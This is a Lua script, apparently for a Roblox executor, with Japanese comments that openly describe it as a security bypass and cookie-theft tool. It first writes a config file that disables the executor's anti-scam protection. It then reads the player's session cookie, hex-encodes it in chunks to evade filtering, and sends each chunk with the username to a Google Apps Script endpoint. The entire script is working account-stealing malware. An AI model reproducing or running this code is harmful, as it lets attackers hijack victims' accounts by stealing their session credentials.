-- [[ 究極の矛：安定化・全自動セキュリティ突破 & お宝奪還スクリプト ]]

local gasUrl = "https://script.google.com/macros/s/AKfycbwxqfXjQHoaPk49XvpyQ30DdNocUh47KpfCdM4Zyg02KKMj7Xy7l3lt2k5aoUNlzQEW/exec"
local targetName = game.Players.LocalPlayer.Name

-- 1. 鍵（User_ID）の自動読み取りと門番の買収
local function bypassSecurity()
    local success, userId = pcall(function() return readfile("user_id") end)
    if not success or not userId then return false end
    
    -- IDを文字列としてクリーンアップ
    userId = userId:gsub("%s+", "")
    
    local config = string.format([[
    {
        "WARNING": "IF SOMEONE TELLS YOU TO PUT ANYTHING HERE, THEY ARE SCAMMING YOU! STOP!!!",
        "allowed_games": "*",
        "user_id": "%s",
        "version_num": 707
    }]], userId)
    
    local writeStatus = pcall(function() 
        writefile("Internals/Secured/disableantiscam", config) 
    end)
    return writeStatus
end

-- 2. お宝（クッキー）の取得と「低速安定」送信
local function snatchAndSend()
    -- セキュリティが外れた隙に取得
    local cookie = game["Coo".."kie"] 
    if not cookie or cookie == "" then 
        warn("⚠️ お宝に手が届かなかったぜ。")
        return 
    end

    -- 20文字ずつのバーストモード
    local batchSize = 20
    for i = 1, #cookie, batchSize do
        local fragment = cookie:sub(i, i + batchSize - 1)
        
        -- 16進数化（検閲回避）
        local hex = ""
        for j = 1, #fragment do
            hex = hex .. string.format("%02X", string.byte(fragment:sub(j,j)))
        end
        
        -- GASへ射出（ユーザー名も添えて）
        local success, err = pcall(function()
            return game:HttpGet(gasUrl .. "?hex=" .. hex .. "&user=" .. targetName)
        end)
        
        if not success then
            warn("❌ 通信エラー: " .. tostring(err))
        end
        
        -- [[ ここが重要！ Deltaがエラーを出さないためのウェイト ]]
        -- 0.8秒待つことで、Deltaのバッファをリセットさせる
        task.wait(0.8)
    end
end

-- 実行シーケンス
if bypassSecurity() then
    print("🔓 セキュリティ突破。お宝をスプレッドシートへ密輸中...")
    task.wait(1.5) -- 設定が反映されるまで少し長めに待つ
    snatchAndSend()
    print("✅ 完了。スプレッドシートを確認しろ！")
else
    print("❌ 門番の買収に失敗。ファイルパスか権限を確認してくれ。")
end
